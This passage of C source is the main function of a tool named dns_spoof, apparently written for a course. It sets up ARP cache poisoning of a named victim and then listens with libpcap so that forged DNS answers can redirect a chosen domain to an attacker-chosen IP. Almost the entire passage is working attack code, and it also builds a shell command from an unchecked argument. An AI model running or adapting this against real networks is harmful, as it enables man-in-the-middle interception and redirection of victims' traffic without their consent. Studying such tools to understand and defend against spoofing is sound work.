    bpf_u_int32 maskp, netp;            // subnet mask                                
    int count = 0, i;
    struct in_addr target_ip;    

    // Get the interface name, target IP address, target_page(liangzk or chanmc) from command line.
    if (argc != 5) {
        fprintf(stderr, "usage: <~/path/to/dns_spoof/dns_spoof> <interface> <victim's-ip-address> <target-ip> <domain-name-to-forge>\n");
        exit(1);
    }                    
    
    memset(&mystruct, 0, sizeof(struct myStruct));
    if_name = argv[1];                  // get the interface to spoof upon    

    //set victim's IP from the argument argv[2]
    inet_aton(argv[2], &(mystruct.victimIP));     
    printf("filter string:\t%s\n", filter_string);

    inet_aton(argv[3], &target_ip);    // target ip that shall be poisoned in victim's DNS cache
    targetIP = (u_char*)(&target_ip);

    if((dns_request_dname = Handle_URL(argv[4])) == NULL) {     // get the domain-to-be-forged, decode it for DNS injection
        printf("Couldn't decode the url of the domain to be forged\n");
        exit(0);
    }

    // set the attacker's MAC from the terminal
    char cmd[100] = {0};
    sprintf(cmd, "ifconfig %s | grep %s", if_name, if_name);
    Get_MAC_From_Terminal(cmd, mystruct.myMAC);                 // get my MAC address   

    Get_IP_From_Device(if_name);                                // get my IP address
    printf("My IP address: %s\n", inet_ntoa(mystruct.myIP));
    
    //get victim's MAC from his IP address        
    Get_Mac_From_IP(inet_ntoa(mystruct.victimIP), mystruct.victimMAC);
    
    // get the gateway's IP amd its MAC 
    Get_Gateway_IP(&(mystruct.gatewayIP));    
    Get_Mac_From_IP(inet_ntoa(mystruct.gatewayIP), mystruct.gatewayMAC);        

    Print_Network_Variables(mystruct);                  //prints Victim's IP and MAC, Gateway's IP and MAC and Attacker's MAC         

    // Open a PCAP packet capture descriptor for the specified interface.    
    mystruct.handle = pcap_open_live(if_name, BUFSIZ, 1, -1, pcap_errbuf);
    if (pcap_errbuf[0] != '\0') {
        printf("something is wrong in pcap_open_live()..\n");
        fprintf(stderr, "%s\n", pcap_errbuf);
    }
    NULL_CHECK(mystruct.handle);

    // Compile the filter for this handle
    if(pcap_compile(mystruct.handle, &fp, filter_string, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n", pcap_errbuf); 
        exit(1);
    }
    // Set the filter for the pcap handle through the compiled program
    if(pcap_setfilter(mystruct.handle, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n", pcap_errbuf); 
        exit(1); 
    }
    printf("pcap handle created, filter compiled and is set\n");
    
    printf("\nHave poisoned the victim with my MAC as the gateway's IP");  
    ARP_Inject(mystruct, false, mystruct.myMAC, &(mystruct.gatewayIP), mystruct.victimMAC, &(mystruct.victimIP)); //sets myMAC for gateway's IP
 //   printf("\nHave poisoned the gateway with my MAC as the victim's IP");  
 //   ARP_Inject(mystruct, false, mystruct.myMAC, &(mystruct.victimIP), mystruct.gatewayMAC, &(mystruct.gatewayIP)); //sets myMAC for victim's IP

    pcap_freecode(&fp);    

    //Start_Timer(&tv, TIME_INTERVAL);
    pcap_loop(mystruct.handle, -1, Main_Callback, (u_char*)(&mystruct)); //Keep listening to the interface to handle any ARP packet until an error occurs

    // Close the PCAP descriptor.
    pcap_close(mystruct.handle);
    return 0;
}
